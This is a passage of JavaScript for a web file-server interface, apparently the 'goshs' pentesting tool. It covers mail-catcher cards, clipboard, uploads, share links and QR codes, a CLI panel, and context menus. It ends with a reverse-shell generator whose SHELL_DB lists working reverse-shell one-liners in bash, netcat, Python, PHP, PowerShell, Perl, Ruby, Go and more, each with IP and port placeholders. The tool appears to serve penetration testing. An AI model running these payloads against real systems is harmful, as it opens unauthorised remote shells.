    htmlSection.appendChild(iframe);
  }

  // Image preview pane
  const previewSection = document.createElement("div");
  previewSection.className = "attach-preview";
  previewSection.style.display = "none";
  previewSection.dataset.pane = "preview";
  imgAtts.forEach((a) => {
    const img = document.createElement("img");
    img.className = "preview-img";
    img.src = `/?smtp&id=${a.id}`;
    img.alt = a.filename;
    img.title = a.filename;
    img.onclick = () => openLightbox(img.src);
    previewSection.appendChild(img);
  });

  // Attachment list
  const attSection = document.createElement("div");
  attSection.className = "mail-attachments";
  attSection.style.display = "none";
  if (atts.length) {
    attSection.innerHTML = `<div class="mail-attachments-label">Attachments (${atts.length})</div>`;
    const list = document.createElement("div");
    list.className = "attach-list";
    atts.forEach((a) => {
      const item = document.createElement("div");
      item.className = "attach-item";
      item.innerHTML = `
                ${attachIcon(a.contentType)}
                <span class="attach-name" title="${esc(a.filename)}">${esc(a.filename)}</span>
                <span class="attach-size">${fmtBytes(a.size)}</span>
                <div class="attach-actions">
                  <a class="btn btn-sm" href="/?smtp&id=${a.id}" download="${esc(a.filename)}" title="Download">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                  </a>
                  ${
                    a.contentType && a.contentType.startsWith("image/")
                      ? `
                  <button class="btn btn-sm" onclick="openLightbox('/?smtp&id=${a.id}')" title="Preview">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
                  </button>`
                      : ""
                  }
                  ${
                    a.contentType === "text/html"
                      ? `
                  <button class="btn btn-sm" onclick="openHTMLPreview('/?smtp&id=${a.id}')" title="Render HTML">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
                  </button>`
                      : ""
                  }
                </div>`;
      list.appendChild(item);
    });
    attSection.appendChild(list);
  }

  // Raw headers
  const rawSection = document.createElement("div");
  rawSection.className = "mail-raw-section";
  rawSection.style.display = "none";
  rawSection.innerHTML = `<pre>${esc(e.rawHeader || "")}</pre>`;

  // Footer
  const footer = document.createElement("div");
  footer.className = "mail-footer";
  footer.innerHTML = `<button class="btn btn-ghost btn-sm" data-action="raw">Raw headers</button>`;

  // Toggle open/close
  function setOpen(open) {
    card.classList.toggle("open", open);
    const chevron = subjRow.querySelector(".mail-chevron");
    if (chevron) chevron.style.transform = open ? "rotate(180deg)" : "";

    // Show the right default pane
    const activeTab =
      (bodyTabsEl ? bodyTabsEl.querySelector(".mail-body-tab.active") : null)
        ?.dataset.tab || (hasHTML ? "html" : "plain");

    if (bodyTabsEl) bodyTabsEl.style.display = open ? "flex" : "none";
    plainSection.style.display =
      open && activeTab === "plain" ? "block" : "none";
    htmlSection.style.display = open && activeTab === "html" ? "block" : "none";
    previewSection.style.display =
      open && activeTab === "preview" ? "flex" : "none";
    if (!bodyTabsEl) {
      // Only one body type — show it directly
      if (hasHTML) htmlSection.style.display = open ? "block" : "none";
      else plainSection.style.display = open ? "block" : "none";
    }
    if (atts.length) attSection.style.display = open ? "block" : "none";
    footer.style.display = open ? "flex" : "none";
  }

  header.onclick = () => setOpen(!card.classList.contains("open"));
  subjRow.onclick = () => setOpen(!card.classList.contains("open"));

  // Tab switching
  if (bodyTabsEl) {
    bodyTabsEl.addEventListener("click", (e) => {
      const tab = e.target.closest(".mail-body-tab");
      if (!tab) return;
      bodyTabsEl
        .querySelectorAll(".mail-body-tab")
        .forEach((t) => t.classList.remove("active"));
      tab.classList.add("active");
      const which = tab.dataset.tab;
      plainSection.style.display = which === "plain" ? "block" : "none";
      htmlSection.style.display = which === "html" ? "block" : "none";
      previewSection.style.display = which === "preview" ? "flex" : "none";
    });
  }

  // Footer actions
  footer.addEventListener("click", (ev) => {
    const btn = ev.target.closest("[data-action]");
    if (!btn) return;
    if (btn.dataset.action === "raw") {
      const showing = rawSection.style.display === "block";
      rawSection.style.display = showing ? "none" : "block";
      btn.textContent = showing ? "Raw headers" : "Hide raw";
    }
  });

  // Assemble
  card.appendChild(header);
  card.appendChild(subjRow);
  if (bodyTabsEl) card.appendChild(bodyTabsEl);
  card.appendChild(plainSection);
  card.appendChild(htmlSection);
  if (hasImgs) card.appendChild(previewSection);
  if (atts.length) card.appendChild(attSection);
  card.appendChild(rawSection);
  card.appendChild(footer);

  // Init footer hidden
  footer.style.display = "none";

  return card;
}
function renderSMTP() {
  const filter = (
    document.getElementById("smtp-search").value || ""
  ).toLowerCase();
  const inbox = document.getElementById("smtp-inbox");
  const empty = document.getElementById("smtp-empty");

  const vis = ST.smtpEvents.filter(
    (e) =>
      !filter ||
      (e.from || "").toLowerCase().includes(filter) ||
      (e.to || []).join(" ").toLowerCase().includes(filter) ||
      (e.subject || "").toLowerCase().includes(filter) ||
      (e.body || "").toLowerCase().includes(filter),
  );

  empty.style.display = vis.length ? "none" : "flex";
  inbox.querySelectorAll(".mail-card").forEach((c) => c.remove());

  vis.forEach((e, i) => {
    inbox.appendChild(buildMailCard(e, i === 0 && !filter));
  });
}

// ── lightbox ──
function openLightbox(src) {
  let lb = document.getElementById("goshs-lightbox");
  if (!lb) {
    lb = document.createElement("div");
    lb.id = "goshs-lightbox";
    lb.className = "lightbox";
    lb.innerHTML = '<img id="goshs-lb-img">';
    lb.onclick = () => lb.classList.remove("open");
    document.body.appendChild(lb);
  }
  document.getElementById("goshs-lb-img").src = src;
  lb.classList.add("open");
}

// ── HTML attachment preview (opens in new tab safely) ──
function openHTMLPreview(url) {
  fetch(url)
    .then((r) => r.text())
    .then((html) => {
      const win = window.open("", "_blank");
      win.document.write(`<!DOCTYPE html><html><head><meta charset="UTF-8">
                <meta http-equiv="Content-Security-Policy" content="script-src 'none'">
                </head><body>${html}</body></html>`);
      win.document.close();
    })
    .catch(() => toast("Failed to load HTML attachment", "error"));
}

function clearSMTP() {
  ST.smtpEvents = [];
  document.getElementById("smtp-badge").textContent = "0";
  ST.ws.send(JSON.stringify({ type: "clearSMTP" }));
  const badge = document.getElementById("collab-badge");
  badge.textContent =
    ST.httpCnt +
    ST.dnsEvents.length +
    ST.smtpEvents.length +
    ST.smbEvents.length;
  if (badge.textContent === "0") badge.classList.remove("show");
  renderSMTP();
}

// ══ CLIPBOARD ══
function onClipboardUpdate(msg) {
  // Reload side and activate clipboard tab
  sessionStorage.setItem("activeTab", "nav-clip");
  location.reload();
}
function sendClip() {
  const txt = document.getElementById("clip-input").value.trim();
  if (!txt) return;
  var msg = {
    type: "newEntry",
    content: txt,
  };
  ST.ws.send(JSON.stringify(msg));
  document.getElementById("clip-input").value = "";
}
function copyClip(id) {
  const body = document.querySelector("#clip-" + id + " .clip-card-body");
  if (body) {
    navigator.clipboard
      .writeText(body.textContent)
      .then(() => toast("Copied!", "success"));
  }
}
function deleteClip(id) {
  var msg = {
    type: "delEntry",
    content: id,
  };
  ST.ws.send(JSON.stringify(msg));
}
function downloadClipboard() {
  window.open("/?cbDown", "_blank");
}
function clearClipboard() {
  result = confirm("Are you sure you want to clear the clipboard?");
  if (result) {
    var msg = {
      type: "clearClipboard",
      content: "",
    };
    ST.ws.send(JSON.stringify(msg)).then(() => toast("Cleared!", "success"));
  }
}

// ══ FILE OPERATIONS ══
function navigateTo(path) {
  window.location.href = path;
}

function filterFiles() {
  const q = document.getElementById("file-search").value.toLowerCase();
  document.querySelectorAll("#file-tbody tr").forEach((tr) => {
    const name = (tr.dataset.name || "").toLowerCase();
    tr.style.display = !q || name.includes(q) ? "" : "none";
  });
}

let sortDir = { name: true, size: true, mtime: true };
function sortTable(col) {
  const asc = (sortDir[col] = !sortDir[col]);
  const tbody = document.getElementById("file-tbody");
  const rows = Array.from(tbody.querySelectorAll("tr[data-name]"));
  rows.sort((a, b) => {
    let va = a.dataset[col] || "",
      vb = b.dataset[col] || "";
    if (col === "size" || col === "mtime") {
      va = parseFloat(va) || 0;
      vb = parseFloat(vb) || 0;
      return asc ? va - vb : vb - va;
    }
    return asc ? va.localeCompare(vb) : vb.localeCompare(va);
  });
  rows.forEach((r) => tbody.appendChild(r));
  document.querySelectorAll(".file-table th[id]").forEach((th) => {
    th.classList.remove("sorted");
    th.querySelector(".sort-arrow").textContent = "↕";
  });
  const th = document.getElementById("th-" + col);
  if (th) {
    th.classList.add("sorted");
    th.querySelector(".sort-arrow").textContent = asc ? "↑" : "↓";
  }
}

function toggleAllChecks(el) {
  document
    .querySelectorAll(".row-check-item")
    .forEach((c) => (c.checked = el.checked));
  updateBulkBar();
}
function updateBulkBar() {
  const checked = document.querySelectorAll(".row-check-item:checked").length;
  const bar = document.getElementById("bulk-bar");
  bar.classList.toggle("show", checked > 0);
  document.getElementById("bulk-count").textContent = checked + " selected";
}
function clearSelection() {
  document
    .querySelectorAll(".row-check-item")
    .forEach((c) => (c.checked = false));
  const all = document.getElementById("chk-all");
  if (all) all.checked = false;
  updateBulkBar();
}
function getSelectedNames() {
  return Array.from(document.querySelectorAll(".row-check-item:checked"))
    .map((c) => c.closest("tr").dataset.name)
    .filter(Boolean);
}
function getSelectedValues() {
  return Array.from(document.querySelectorAll(".row-check-item:checked"))
    .map((c) => c.closest("tr").dataset.value)
    .filter(Boolean);
}
function downloadSelected() {
  // This one takes all the selected and forms the right zip download
  const url = new URL(window.location.href);
  getSelectedValues().forEach((val) => {
    url.searchParams.append("file", val);
  });
  url.searchParams.append("bulk", "true");
  window.open(url.href, "_blank");
  clearSelection();
}
function downloadBulk() {
  // This one selects everything in the current view and forms the right zip download
  document.querySelectorAll("#file-tbody tr[data-name]").forEach((tr) => {
    if (tr.style.display !== "none") {
      const cb = tr.querySelector(".row-check-item");
      if (cb) cb.checked = true;
    }
  });
  updateBulkBar();
  downloadSelected();
}
function deleteSelected() {
  const vals = getSelectedValues();
  if (!vals.length) return;
  if (!confirm(`Delete ${vals.length} item(s)?`)) return;
  Promise.all(vals.map((val) => deleteFile(val, true)))
    .then(() => location.reload())
    .catch(() => toast("Delete failed", "error"));
}
function getCsrfToken() {
  const meta = document.querySelector('meta[name="csrf-token"]');
  return meta ? meta.getAttribute("content") : "";
}
function deleteFile(path, bulk) {
  let ok;
  !bulk
    ? (ok = confirm("Do you really want to delete the file or directory?"))
    : (ok = true);

  if (ok) {
    var url = "";
    location.protocol !== "https:"
      ? (url = "http://" + window.location.host + path)
      : (url = "https://" + window.location.host + path);
    fetch(url, {
      method: "DELETE",
      headers: { "X-CSRF-Token": getCsrfToken() },
    })
      .then(() => location.reload())
      .catch(() => toast("Delete failed", "error"));
  }
}

// ══ UPLOAD ══
function openUpload() {
  openModal("upload-modal");
}
function openMkdir() {
  openModal("mkdir-modal");
  setTimeout(() => document.getElementById("mkdir-input").focus(), 50);
}

function handleFileSelect(files) {
  Array.from(files).forEach((f) => {
    if (
      !ST.pendingUploads.find((p) => p.name === f.name && p.size === f.size)
    ) {
      ST.pendingUploads.push(f);
    }
  });
  renderUploadList();
}
function renderUploadList() {
  const list = document.getElementById("upload-file-list");
  list.innerHTML = "";
  ST.pendingUploads.forEach((f, i) => {
    const item = document.createElement("div");
    item.className = "upload-file-item";
    item.innerHTML = `<span class="fname">${esc(f.name)}</span><span class="fsize">${fmtBytes(f.size)}</span>
<button class="fremove" onclick="removeUpload(${i})">✕</button>`;
    list.appendChild(item);
  });
}
function removeUpload(i) {
  ST.pendingUploads.splice(i, 1);
  renderUploadList();
}
function startUpload() {
  if (!ST.pendingUploads.length) {
    toast("No files selected", "warn");
    return;
  }
  const fd = new FormData();
  ST.pendingUploads.forEach((f) => fd.append("file", f));
  const wrap = document.getElementById("upload-progress-wrap");
  const bar = document.getElementById("upload-progress-bar");
  wrap.style.display = "block";
  bar.style.width = "0";

  const xhr = new XMLHttpRequest();
  xhr.open("POST", `${window.location.href}upload`);
  xhr.setRequestHeader("X-CSRF-Token", getCsrfToken());
  xhr.upload.onprogress = (e) => {
    if (e.lengthComputable) bar.style.width = (e.loaded / e.total) * 100 + "%";
  };
  xhr.onload = () => {
    if (xhr.status === 200) {
      toast("Upload complete!", "success");
      closeModal("upload-modal");
      ST.pendingUploads = [];
      setTimeout(() => location.reload(), 600);
    } else if (xhr.status === 413) {
      const limitBytes = parseInt(
        document.querySelector('meta[name="max-upload"]')?.content || "0",
        10,
      );
      const msg =
        limitBytes > 0
          ? "Upload rejected: exceeds the " +
            fmtBytes(limitBytes) +
            " server limit"
          : "Upload rejected: file too large";
      toast(msg, "error");
    } else toast("Upload failed: " + xhr.statusText, "error");
  };
  xhr.onerror = () => toast("Upload failed", "error");
  xhr.send(fd);
}
function createDir() {
  const name = document.getElementById("mkdir-input").value.trim();
  if (!name) return;

  const target = name.endsWith("/") ? name : name + "/";
  fetch(target, {
    method: "POST",
    headers: { "X-CSRF-Token": getCsrfToken() },
  })
    .then((r) => {
      // if response http.Created
      if (r.status === 201) {
        toast("Created: " + name, "success");
        closeModal("mkdir-modal");
        setTimeout(() => location.reload(), 600);
      } else toast("Failed", "error");
    })
    .catch(() => toast("Network error", "error"));
}

// ══ DRAG-DROP ══
function initDrop() {
  const overlay = document.getElementById("drop-overlay");
  let dragCnt = 0;
  document.addEventListener("dragenter", (e) => {
    if (!e.dataTransfer.types.includes("Files")) return;
    dragCnt++;
    overlay.classList.add("active");
    e.preventDefault();
  });
  document.addEventListener("dragleave", () => {
    if (--dragCnt <= 0) {
      dragCnt = 0;
      overlay.classList.remove("active");
    }
  });
  document.addEventListener("dragover", (e) => {
    e.preventDefault();
  });
  document.addEventListener("drop", (e) => {
    e.preventDefault();
    dragCnt = 0;
    overlay.classList.remove("active");
    const files = e.dataTransfer.files;
    if (files.length) {
      handleFileSelect(files);
      openModal("upload-modal");
    }
  });
  // modal drop area
  const mda = document.getElementById("modal-drop-area");
  if (mda) {
    mda.addEventListener("dragover", (e) => {
      e.preventDefault();
      mda.classList.add("hover");
    });
    mda.addEventListener("dragleave", () => mda.classList.remove("hover"));
    mda.addEventListener("drop", (e) => {
      e.preventDefault();
      mda.classList.remove("hover");
      handleFileSelect(e.dataTransfer.files);
    });
  }
}

// ══ SHARE / QR ══
let _shareTarget = "";
function shareFile(name) {
  _shareTarget = name;
  document.getElementById("share-result").style.display = "none";
  document.getElementById("share-limit").value = "0";
  document.getElementById("share-expire").value = "0";
  openModal("share-modal");
}
function generateShareLink() {
  const limit = document.getElementById("share-limit").value;
  const expire = parseInt(document.getElementById("share-expire").value) || 60;
  const expireSeconds = expire * 60;

  var base = "";
  location.protocol !== "https:"
    ? (base = "http://" + window.location.host)
    : (base = "https://" + window.location.host);

  let url = `${base}${_shareTarget}?share&expires=${expireSeconds}`;
  if (parseInt(limit) > 0) {
    url += `&limit=${encodeURIComponent(limit)}`;
  } else {
    url += "&limit=-1";
  }

  fetch(url, {
    method: "GET",
    headers: {
      Accept: "application/json",
    },
  })
    .then((r) => r.json())
    .then((d) => {
      const res = document.getElementById("share-result");
      res.style.whiteSpace = "pre";
      res.style.display = "block";
      res.textContent = d.urls.join("\n");

      const qr = document.getElementById("share-result-qr");
      qr.style.display = "block";
      new QRious({
        element: document.getElementById("share-qr-canvas"),
        value: d.urls[0],
        size: 200,
      });
    })
    .catch(() => toast("Share failed", "error"));
}
function showQR(path) {
  var url = "";
  location.protocol !== "https:"
    ? (url = "http://" + window.location.host)
    : (url = "https://" + window.location.host);

  path = path.replaceAll("//", "/");
  link = `${url}/${path}`.replaceAll("//", "/");

  // Generate QR code on canvas
  new QRious({
    element: document.getElementById("qr-canvas"),
    value: link,
    size: 200,
  });

  document.getElementById("qr-url").textContent = link;
  openModal("qr-modal");
}

// ══ SHARED LINKS PANEL ══
function initSharedLinks() {
  // Build URLs and relative times for each card
  const base = location.protocol + "//" + window.location.host;
  document.querySelectorAll(".share-card").forEach((card) => {
    const id = card.id.replace("share-card-", "");
    const urlEl = document.getElementById("share-url-" + id);
    if (urlEl) {
      const path = card.querySelector(".share-card-path").textContent.trim();
      urlEl.textContent = `${base}${path}?token=${id}`;
    }
  });
  updateShareExpiries();
  setInterval(updateShareExpiries, 30000);
}

function updateShareExpiries() {
  const now = Math.floor(Date.now() / 1000);
  document.querySelectorAll(".share-expiry-rel").forEach((el) => {
    const exp = parseInt(el.dataset.expires, 10);
    const diff = exp - now;
    if (diff <= 0) {
      el.textContent = "expired";
      el.style.color = "var(--danger)";
    } else if (diff < 60) {
      el.textContent = `in ${diff}s`;
      el.style.color = "var(--warn)";
    } else if (diff < 3600) {
      el.textContent = `in ${Math.floor(diff / 60)}m`;
      el.style.color = "var(--warn)";
    } else if (diff < 86400) {
      el.textContent = `in ${Math.floor(diff / 3600)}h`;
      el.style.color = "var(--text1)";
    } else {
      el.textContent = `in ${Math.floor(diff / 86400)}d`;
      el.style.color = "var(--text1)";
    }
  });
}

function showShareQR(token) {
  const urlEl = document.getElementById("share-url-" + token);
  if (!urlEl) return;
  const url = urlEl.textContent.trim();
  new QRious({
    element: document.getElementById("qr-canvas"),
    value: url,
    size: 200,
  });
  document.getElementById("qr-url").textContent = url;
  openModal("qr-modal");
}

function copyShareUrl(token) {
  const urlEl = document.getElementById("share-url-" + token);
  if (!urlEl) return;
  navigator.clipboard
    .writeText(urlEl.textContent.trim())
    .then(() => toast("URL copied", "success"))
    .catch(() => toast("Copy failed", "error"));
}

function deleteShareLink(token, path) {
  // Adjust the endpoint path to match your handler if needed
  let ok;
  ok = confirm("Do you really want to delete the shared link?");

  if (ok) {
    var url = "";
    location.protocol !== "https:"
      ? (url = "http://" + window.location.host + "/" + "?token=" + token)
      : (url = "https://" + window.location.host + "/" + "?token=" + token);
  }

  fetch(url, { method: "DELETE" });
  sessionStorage.setItem("activeTab", "nav-share");
  location.reload();
}

// ══ CLI ══
const cliHistory = [];
let cliHistIdx = -1;
function initCliHistory() {
  const input = document.getElementById("cli-input");
  if (!input) return;
  input.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      const cmd = input.value.trim();
      if (!cmd) return;
      cliHistory.unshift(cmd);
      cliHistIdx = -1;
      appendCLI(cmd, "cmd");
      input.value = "";
      ST.ws.send(JSON.stringify({ type: "command", content: cmd }));
    } else if (e.key === "ArrowUp") {
      cliHistIdx = Math.min(cliHistIdx + 1, cliHistory.length - 1);
      input.value = cliHistory[cliHistIdx] || "";
      e.preventDefault();
    } else if (e.key === "ArrowDown") {
      cliHistIdx = Math.max(cliHistIdx - 1, -1);
      input.value = cliHistIdx >= 0 ? cliHistory[cliHistIdx] : "";
      e.preventDefault();
    }
  });
}
function appendCLI(text, cls) {
  const out = document.getElementById("cli-output");
  if (!out) return;
  const line = document.createElement("pre");
  line.className = "cli-line" + (cls ? " " + cls : "");
  line.textContent = text;
  out.appendChild(line);
  out.scrollTop = out.scrollHeight;
}
function cliOutput(msg) {
  if (msg.content) {
    appendCLI(msg.content, "");
  } else {
    appendCLI("something went wrong", "err");
  }
}

// ══ MODALS ══
function openModal(id) {
  document.getElementById(id).classList.add("open");
}
function closeModal(id) {
  document.getElementById(id).classList.remove("open");
  if (id === "share-modal") {
    location.reload();
  }
}
document.addEventListener("click", (e) => {
  if (e.target.classList.contains("modal-backdrop")) closeModal(e.target.id);
});
document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") {
    document
      .querySelectorAll(".modal-backdrop.open")
      .forEach((m) => m.classList.remove("open"));
    closeCtx();
  }
});

// ══ CONTEXT MENU ══
function initContextMenu() {
  const menu = document.getElementById("ctx-menu");
  document.getElementById("file-tbody").addEventListener("contextmenu", (e) => {
    const tr = e.target.closest("tr[data-name]");
    if (!tr || !tr.dataset.name || tr.dataset.name === "..") return;
    e.preventDefault();
    const name = tr.dataset.name;
    const isDir = tr.dataset.isdir === "true";
    document.getElementById("ctx-download").style.display = isDir ? "none" : "";
    document.getElementById("ctx-open").onclick = () => {
      window.location.href = name + (isDir ? "/" : "");
      closeCtx();
    };
    document.getElementById("ctx-download").onclick = () => {
      const a = document.createElement("a");
      a.href = name;
      a.download = name;
      a.click();
      closeCtx();
    };
    document.getElementById("ctx-share").onclick = () => {
      shareFile(name);
      closeCtx();
    };
    document.getElementById("ctx-delete").onclick = () => {
      deleteFile(name);
      closeCtx();
    };
    menu.style.left = Math.min(e.clientX, window.innerWidth - 180) + "px";
    menu.style.top = Math.min(e.clientY, window.innerHeight - 180) + "px";
    menu.classList.add("open");
  });
  document.addEventListener("click", closeCtx);
}
function closeCtx() {
  document.getElementById("ctx-menu").classList.remove("open");
}

// ══ TOASTS ══
function toast(msg, type = "success") {
  const icons = {
    success:
      '<svg class="toast-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>',
    error:
      '<svg class="toast-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>',
    warn: '<svg class="toast-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
  };
  const el = document.createElement("div");
  el.className = `toast ${type}`;
  el.innerHTML = (icons[type] || "") + esc(msg);
  const container = document.getElementById("toast-container");
  container.appendChild(el);
  setTimeout(() => {
    el.style.opacity = "0";
    el.style.transition = "opacity .3s";
    setTimeout(() => el.remove(), 300);
  }, 3500);
}

// ══ UTILS ══
function esc(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}
function fmtBytes(b) {
  if (b < 1024) return b + " B";
  if (b < 1048576) return (b / 1024).toFixed(1) + " KB";
  if (b < 1073741824) return (b / 1048576).toFixed(1) + " MB";
  return (b / 1073741824).toFixed(2) + " GB";
}

// ═══════════════════════════════════════════
// CATCHER / REV SHELL GENERATOR
// ═══════════════════════════════════════════

const SHELL_DB = {
  // Bash
  "Bash -i":                    "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
  "Bash 196":                   "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196",
  "Bash read line":             "exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
  "Bash udp":                   "sh -i >& /dev/udp/{IP}/{PORT} 0>&1",
  // Netcat
  "nc -e":                      "nc -e /bin/sh {IP} {PORT}",
  "nc.exe -e":                  "nc.exe -e cmd.exe {IP} {PORT}",
  "BusyBox nc -e":              "busybox nc {IP} {PORT} -e sh",
  "nc -c":                      "nc -c sh {IP} {PORT}",
  "nc mkfifo":                  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
  "ncat -e":                    "ncat {IP} {PORT} -e /bin/sh",
  "ncat udp":                   "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|ncat -u {IP} {PORT} >/tmp/f",
  // Python
  "Python3 #1":                 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
  "Python3 #2":                 'python3 -c \'import socket,subprocess,os,pty;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'',
  // PHP
  "PHP exec":                   'php -r \'$s=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
  "PHP shell_exec":             'php -r \'$s=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
  "PHP passthru":               'php -r \'$s=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");\'',
  // PowerShell
  "PowerShell #1":              "$LHOST = \"{IP}\"; $LPORT = {PORT}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
  "PowerShell #2":              "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
  "PowerShell #3 (Base64)":     "PS_B64:$client = New-Object System.Net.Sockets.TCPClient('{IP}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
  "PowerShell #4 (TLS)":        "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{IP}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
  "PowerShell #5 (Base64, stderr)": "PS_B64:$ErrorView=\"NormalView\";$ErrorActionPreference=\"Continue\";$c=New-Object System.Net.Sockets.TCPClient('{IP}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=([text.encoding]::ASCII).GetString($b,0,$i);try{$o=iex $d 2>&1 3>&1 4>&1 5>&1 6>&1|Out-String}catch{$o=$_|Out-String}if([string]::IsNullOrEmpty($o)){$o=\"\"}$p=\"PS \"+(pwd).Path+\"> \";[byte[]]$sb=([text.encoding]::ASCII).GetBytes($o+$p);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()",
  // Other
  "Perl":                       'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
  "Ruby":                       'ruby -rsocket -e\'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
  "Socat #1":                   "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}",
  "Java #1":                    'Runtime rt = Runtime.getRuntime();String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"};rt.exec(cmd);',
  "Lua":                        'lua -e \'require("socket");require("os");t=socket.tcp();t:connect("{IP}","{PORT}");os.execute("/bin/sh -i <&3 >&3 2>&3");\'',
  "Awk":                        'awk \'BEGIN{s="/inet/tcp/0/{IP}/{PORT}";while(1){do{printf"$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print$0|&s;close(c)}}while(c!="exit")}}\'',
  "node.js":                    "require('child_process').exec('/bin/sh -i <&3 >&3 2>&3')",
  "Golang":                     'package main\x0aimport(\x0a"os/exec"\x0a"net"\x0a)\x0afunc main(){\x0ac:=exec.Command("/bin/sh")\x0an,_:=net.Dial("tcp","{IP}:{PORT}")\x0ac.Stdin=n;c.Stdout=n;c.Stderr=n;c.Run()\x0a}',
};

const CT = {
  listeners: {},
  sessions: {},
  tabCounter: 0,
};

// ── Generator ──
function initGenerator() {
  const sel = document.getElementById("gen-shell");
  if (!sel) return;
  Object.keys(SHELL_DB).forEach((name) => {
    const opt = document.createElement("option");
    opt.value = name;
    opt.textContent = name;
    sel.appendChild(opt);
  });
  // Pre-fill IP from browser location
